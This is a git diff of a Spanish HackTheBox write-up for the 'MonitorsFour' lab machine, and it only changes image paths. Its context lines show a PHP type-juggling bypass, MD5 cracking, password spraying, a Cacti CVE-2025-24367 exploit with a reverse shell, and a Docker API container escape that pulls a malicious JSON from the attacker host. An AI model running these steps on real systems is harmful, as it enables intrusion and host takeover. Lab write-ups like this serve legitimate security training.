@@ -52,7 +52,7 @@ Con esto hecho, ahora poniendo en nuestro navegador tanto el dominio como la IP,
 http://monitorsfour.htb
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/8.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/8.jpg)
 
 Analizando un poco la web, encontramos un panel de login. Esto nos puede servir para comprobar que efectivamente estamos ante un Windows, o por si el contrario, existe algún subsistema de Linux por detrás, ya que es raro que encontremos nginx. Una forma de comprobarlo, es probar rutas existentes de la siguiente forma. En Linux, es case-sensitive, es decir, si ponemos "lOGin" o "LOGIN", nos va a decir que el recurso no existe. En Windows, no es case-sensitive, es decir, da igual como lo pongamos, que va a apuntar al mismo archivo. De resto, Wappalyzer nos chiva que se está empleando PHP 8.3.27 y poco más. 
 
@@ -60,7 +60,7 @@ Analizando un poco la web, encontramos un panel de login. Esto nos puede servir 
 http://monitorsfour.htb/login
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/10.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/10.jpg)
 
 En cuanto al panel de Login, podemos hacer algunas pruebas para tratar de burlarlo, pero no conseguimos nada. Sin usuarios válidos o existentes, tampoco vamos a realizar ataques de fuerza bruta, por lo que nos toca seguir enumerando. Vamos a realizar Fuzzing para tratar de descubrir directorios ocultos. 
 
@@ -68,7 +68,7 @@ En cuanto al panel de Login, podemos hacer algunas pruebas para tratar de burlar
 gobuster dir -u http://monitorsfour.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,js -o hidden_directory
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/11.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/11.jpg)
 
 
 Empezamos a ver ya algunas cosas interesantes. Revisando estos directorios vamos a ir viendo cositas. Si visitamos /user veremos el siguiente mensaje 
@@ -77,7 +77,7 @@ Empezamos a ver ya algunas cosas interesantes. Revisando estos directorios vamos
 http://monitorsfour.htb/user
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/12.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/12.jpg)
 
 "{"error":"Missing token parameter"}". Parece que nos está pidiendo el parámetro token, por lo tanto, vamos a probar cosas en este endpoint. 
 
@@ -85,7 +85,7 @@ http://monitorsfour.htb/user
 http://monitorsfour.htb/user?token=test
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/13.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/13.jpg)
 
 Podemos sacar la primera conclusión, y es que el parámetro token es obligatorio. Al probar cualquier cosa, por ejemplo "test" el mensaje que nos da es que el token existe, pero no es válido. Esto nos hace pensar que el servidor puede estar validando un token de autenticación o algo así. Dado que se está empleando PHP, una de las primeras ideas que se nos pueden venir a la cabeza es probar un "Type Juggling Attack". Este tipo de ataque no depende de una versión específica de PHP, si no que depende de como el desarrollador haya escrito el código. En PHP cuando se compara con = =, se convierten los valores a un tipo común antes de compararlos. Esto puede causar coincidencias inesperadas si uno de los valores se interpreta como 0, true, etc. Lo ideal sería utilizar = = = para comparaciones. Podemos documentarnos más en el siguiente artículo 
 
@@ -119,7 +119,7 @@ Ahora vamos a emplear wfuzz para ver como responde el aplicativo. Vamos a elimin
 wfuzz -c --hc=404 --hw=4 -t 200 -w payloads.txt 'http://monitorsfour.htb/user?token=FUZZ'
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/14.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/14.jpg)
 
 Vemos que para los Payloads "0e1" "00" "0e123456" y "0", nos devuelve otra cosa. Vamos a echarle un vistazo. Podemos utilizar cualquiera de los Payloads válidos. 
 
@@ -128,7 +128,7 @@ curl -s -X GET 'http://monitorsfour.htb/user?token=0e1' | jq
 ```
 
 
-![Captura de pantalla 2](/assets/img/imagery/15.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/15.jpg)
 
 Vemos información de varios usuarios. Quizás el más interesantes sea el del administrador. Tenemos información bastante interesante y una contraseña de 32 caracteres hexadecimales que se corresponde con el formato de un Hash MD5. Vamos a realizar un ataque de fuerza bruta para ver si conseguimos obtener la contraseña en texto claro 
 
@@ -140,7 +140,7 @@ echo -n  "56b32eb43e6f15395f6c46c1c9e1cd36" | wc -c
 hash-identifier 
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/16.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/16.jpg)
 
 Vamos a meter el hash en un archivo llamado hash.txt y vamos a romperlo con hashcat y john 
 
@@ -159,21 +159,21 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
 ```
 
 
-![Captura de pantalla 2](/assets/img/imagery/17.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/17.jpg)
 
 
 ```bash
 hashcat --example-hashes | grep -i "md5" -B 10 -A 5
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/18.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/18.jpg)
 
 ```bash
 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 0 --show hash.txt
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/19.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/19.jpg)
 
 Si queremos hacerlo con john simplemente utilizaríamos el siguiente comando 
 
@@ -182,7 +182,7 @@ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 john --format=raw-md5 --show hash.txt
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/20.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/20.jpg)
 
 Pues tenemos credenciales. Podemos probar con netexec para ver si nos sirven para ganar acceso al sistema por WinRM, pero vamos a ver que no son válidas. 
 
@@ -202,7 +202,7 @@ Usuario: admin
 Contraseña: worderful1
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/21.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/21.jpg)
 
 Tras un buen rato investigando este panel de admin, no encontramos nada realmente útil que pueda servirnos. En este punto, algo que podemos hacer es seguir enumerando cosas, por ejemplo subdominios. Podemos tirar de gobuster o de wfuzz. 
 
@@ -211,14 +211,14 @@ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-11000
 ```
 
 
-![Captura de pantalla 2](/assets/img/imagery/22.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/22.jpg)
 
 
 ```bash
 wfuzz -c --hc=404 --hw=9 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.monitorsfour.htb" http://monitorsfour.htb
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/23.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/23.jpg)
 
 Pues tenemos un nuevo subdominio que tendremos que investigar y añadir a nuestro /etc/hosts 
 
@@ -232,13 +232,13 @@ Vamos a echarle un vistazo a ver qué encontramos
 http://cacti.monitorsfour.htb
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/24.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/24.jpg)
 
 Vemos algo llamado "cacti", la versión 1.2.28 y un panel de Login. Investigando un poco, descubrimos que Cacti, es un software de monitorización que sirve para recopilar métricas de red, sistemas, servidores, mostrar gráficas, estadísticas, alertas, etc. La versión que presenta, es estable y relativamente reciente. Antes de pasar a buscar vulnerabilidades conocidas o empezar a probar cosas, recordar que tenemos unas credenciales. Como siempre, es bueno probarlas en otros lugares por si hay reutilización de contraseña, pero a priori parece que no. 
 
 En este punto, revisando un poco las evidencias hasta ahora, vemos lo siguiente. 
 
-![Captura de pantalla 2](/assets/img/imagery/15.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/15.jpg)
 
 El nombre del usuario admin, es Marcus Higgins. Podemos tratar de crearnos un diccionario que contemple variantes de su nombre y apellido, y probar un ataque de fuerza bruta empleando la misma contraseña. 
 
@@ -260,13 +260,13 @@ Ahora podemos abrirnos Burpsuite y realizar un ataque de tipo Snipper probando e
 burpsuite & disown
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/25.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/25.jpg)
 
 Vamos a enviar la petición con CTRL + I al Intruder. Seleccionamos un ataque de tipo Snipper. Marcamos el campo de usuario como Payaload y cargamos la lista de usuarios creada. En el campo password ponemos la contraseña "wonderful1". Ahora quitamos el URL-Encode y le damos a Start Attack.
 
-![Captura de pantalla 2](/assets/img/imagery/26.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/26.jpg)
 
-![Captura de pantalla 2](/assets/img/imagery/27.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/27.jpg)
 
 Analizando la respuesta, vemos que para el usuario marcus, recibimos un código de estado 302 (Redireccionamiento). Esto tiene mejor pinta, vamos a probar de nuevo a autenticarnos en el panel de Cacti, pero en esta ocasión como el usuario marcus y empleando la misma contraseña 
 
@@ -275,7 +275,7 @@ Usuario: marcus
 Contrseña: wonderful1
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/28.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/28.jpg)
 
 Ahora ya sí, tenemos mejor suerte y conseguimos ganar acceso al panel de administración de Cacti. Investigando un poco sobre Cacti y vulnerabilidades recientes, descubrimos el siguiente artículo (CVE-2025-24367)
 
@@ -313,13 +313,13 @@ nc -nvlp 443
 python3 exploit.py -u marcus -p wonderful1 -i 10.10.14.94 -l 443 -url http://cacti.monitorsfour.htb
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/29.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/29.jpg)
 
 
 Como vemos el exploit se ejecuta correctamente y si vamos a nuestra sesión de Netcat, deberíamos haber ganado una Shell como el usuario www-data en este caso 
 
 
-![Captura de pantalla 2](/assets/img/imagery/30.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/30.jpg)
 
 De hecho, como intuíamos, seguramente estemos en un Windows con un subsistema Linux, ya que hemos ganado acceso a un contenedor (172.18.0.3). Vamos a hacer un tratamiento de la TTY como siempre y ya empezamos a enumerar la máquina objetivo desde dentro para elevar nuestros privilegios y esas cosas 
 
@@ -342,7 +342,7 @@ find / -type f -name user.txt 2>/dev/null
 cat /home/marcus/user.txt
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/31.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/31.jpg)
 
 Ahora la idea es elevar nuestros privilegios. Como veíamos antes, no estamos en la IP de la máquina objetivo, si no que estamos en 172.18.0.3, que parece ser un contenedor dentro de la máquina. De hecho si nos vamos a la raíz y listamos archivos y directorios ocultos, vamos a ver ./dockerenv, lo que nos confirma que estamos en un contenedor dentro de Docker. 
 
@@ -350,7 +350,7 @@ Ahora la idea es elevar nuestros privilegios. Como veíamos antes, no estamos en
 ls -la / 
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/32.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/32.jpg)
 
 
 Si lanzamos el siguiente comando, vamos a ver cual es la puerta de enlace (Gateway del bridge de Docker), en este caso 172.18.0.1. 
@@ -360,7 +360,7 @@ ip route
 ```
 
 
-![Captura de pantalla 2](/assets/img/imagery/33.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/33.jpg)
 
 También es recomendable revisar la configuración DNS del contenedor. Vamos a echarle un vistazo al /etc/resolv.conf. Este archivo nos indica qué servidores DNS debe usar el sistema para resolver nombres de dominio. 
 
@@ -368,7 +368,7 @@ También es recomendable revisar la configuración DNS del contenedor. Vamos a e
 cat /etc/resolv.conf
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/34.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/34.jpg)
 
 Como vemos, 127.0.0.11 es el DNS interno de Docker, que reenvía las consultas al DNS del Host. También vemos el host al que Docker reenvía las consultas, 192.168.65.7, que quiero pensar que es el Host Windows de la máquina objetivo. Por lo tanto, lo que vamos a hacer es enumerar este host para ver que puertos tiene abiertos por ejemplo. 
 
@@ -404,7 +404,7 @@ chmod +x port_scan.sh
 ./port_scan.sh
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/35.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/35.jpg)
 
 
 Lo vemos de una forma un poco primitiva, pero nos sirve para ir haciéndonos una pequeña idea. Vemos el puerto 55 (DNS), también el puerto 3128 y el puerto 5555, que por lo que hemos podido investigar suele estar asociado a Android Debug Bridge (ADB), un software de Debugging. Dejamos para el final el puerto 2375, ya que es el más importante en este caso. 
@@ -422,7 +422,7 @@ Lo que vamos a hacer es crear un contenedor malicioso que monte C:\ del host Win
 curl http://192.168.65.7:2375/images/json
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/36.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/36.jpg)
 
 Se ve un poco caótico porque no podemos utilizar jq, pero podemos identificar en "RepoTags" el nombre de la imagen con su etiqueta. En este caso vemos "docker_setup-nginx-php:latest". Esta es la imagen que usaremos. 
 
@@ -456,7 +456,7 @@ Lo descargamos en la máquina objetivo.
 curl http://10.10.14.94/evil_container.json -o evil_container.json
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/37.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/37.jpg)
 
 Ahora desde el contenedor, vamos a crear el contenedor con el JSON malicioso que le hemos pasado. Esto debería devolvernos un JSON con el ID del nuevo contenedor. 
 
@@ -464,7 +464,7 @@ Ahora desde el contenedor, vamos a crear el contenedor con el JSON malicioso que
 curl -H "Content-Type: application/json" -d @evil_container.json http://192.168.65.7:2375/containers/create -o response.json
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/38.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/38.jpg)
 
 ```
 {"Id":"32ec065ab4ea4b2aaf72905c2ba4d76b23973d1c53fe9a7bdda8668d6e252365","Warnings":[]}
@@ -483,7 +483,7 @@ curl -X POST http://192.168.65.7:2375/containers/32ec065ab4ea4b2aaf72905c2ba4d76
 Si volvemos a nuestra sesión de Netcat, veremos que hemos ganado una Shell como el usuario root 
 
 
-![Captura de pantalla 2](/assets/img/imagery/39.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/39.jpg)
 
 
 Seguimos dentro del contenedor, pero hemos montado la raíz de Windows C:\ en /host_root, por lo tanto, podemos movernos a este directorio y ver los archivos del equipo Windows. 
@@ -494,7 +494,7 @@ ls -la
 ```
 
 
-![Captura de pantalla 2](/assets/img/imagery/40.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/40.jpg)
 
 Ya tan solo nos quedaría localizar la Flag root.txt y hacerle un cat 
 
@@ -503,7 +503,7 @@ cd /host_root/Users/Administrator/Desktop
 cat root.txt
 ```
 
-![Captura de pantalla 2](/assets/img/imagery/41.jpg)
+![Captura de pantalla 2](/assets/img/monitorsfour/41.jpg)
 
 
 
